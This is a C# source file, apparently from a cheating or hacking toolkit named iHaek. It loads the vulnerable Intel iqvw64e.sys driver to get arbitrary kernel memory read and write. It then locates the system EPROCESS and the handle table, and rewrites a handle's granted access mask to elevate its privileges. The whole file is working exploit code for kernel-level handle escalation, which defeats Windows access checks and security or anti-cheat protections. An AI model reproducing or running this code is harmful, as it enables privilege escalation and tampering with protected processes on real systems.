using iHaek.Utils;

namespace iHaek.iqvw64e;

public unsafe class ElevateHandle
{
    private readonly Wrapper _driver = new();
    private readonly DynamicData? _dynamicData;
    private readonly ulong _kernelEprocessAddress;

    public ElevateHandle()
    {
        if (!_driver.LoadDriver())
        {
            SuccessfullyInited = false;
            return;
        }

        try
        {
            _dynamicData = new DynamicData();
        }
        catch (Exception ex)
        {
            Console.WriteLine($@"[!] Failed to initializate dynamic data! - Message: ""{ex.Message}""");
            SuccessfullyInited = false;
            return;
        }

        _kernelEprocessAddress = QueryKernelEprocessAddress();

        if (_kernelEprocessAddress == 0)
        {
            Console.WriteLine(@"[!] Cant find kernel EPROCESS address!");
            SuccessfullyInited = false;
            return;
        }

        SuccessfullyInited = true;
    }

    public bool SuccessfullyInited { get; }

    public bool Elevate(ulong handle, dynamic desiredAccess)
    {
        if (!_driver.DriverIsLoadedAndWorking()) return false;

        var handleTableAddress = _driver.ReadMemory<ulong>(_kernelEprocessAddress + _dynamicData!.ObjectTable);

        var handleTable = _driver.ReadMemory<KernelStructs._HANDLE_TABLE>(handleTableAddress);

        var entryAddress = (ulong)ExpLookupHandleTableEntry(&handleTable, handle);

        if (entryAddress == 0)
            throw new Exception("ExpLookupHandleTableEntry failed!");

        Console.WriteLine($@"[+] HANDLE_TABLE_ENTRY address: 0x{entryAddress.ToString("X2")}");

        _driver.ReadMemory<KernelStructs._HANDLE_TABLE_ENTRY>(entryAddress);

        return _driver.WriteMemory(entryAddress + 8, (ulong)desiredAccess);
    }

    private ulong QueryKernelEprocessAddress()
    {
        var eprocessPointer = (ulong)KernelHelper.FindKernelProcedure("PsInitialSystemProcess");

        var kernelEprocessAddress = _driver.ReadMemory<ulong>(eprocessPointer);

        Console.WriteLine($@"[+] Kernel EPROCESS Address: 0x{kernelEprocessAddress.ToString("X2")}");

        return kernelEprocessAddress;
    }

    private KernelStructs._HANDLE_TABLE_ENTRY* ExpLookupHandleTableEntry(void* handleTable, ulong handle)
    {
        ulong result; // rax@4

        var a1 = (ulong)handleTable;

        var v2 = handle & 0xFFFFFFFFFFFFFFFCu;
        if (v2 < *(uint*)a1)
        {
            var v3 = (long)*(ulong*)(a1 + 8); // r8@2
            switch (*(ulong*)(a1 + 8) & 3)
            {
                case > 0:
                {
                    ulong v5;
                    if ((*(uint*)(a1 + 8) & 3) == 1)
                    {
                        v5 = _driver.ReadMemory<ulong>((ulong)v3 + 8 * (v2 >> 10) - 1);
                        result = v5 + 4 * (v2 & 0x3FF);
                    }
                    else
                    {
                        v5 = _driver.ReadMemory<ulong>(_driver.ReadMemory<ulong>((ulong)v3 + 8 * (v2 >> 19) - 2) +
                                                       8 * ((v2 >> 10) & 0x1FF));
                        result = v5 + 4 * (v2 & 0x3FF);
                    }

                    break;
                }
                default:
                    result = (ulong)v3 + 4 * v2;
                    break;
            }
        }
        else
        {
            result = 0;
        }

        return (KernelStructs._HANDLE_TABLE_ENTRY*)result;
    }
}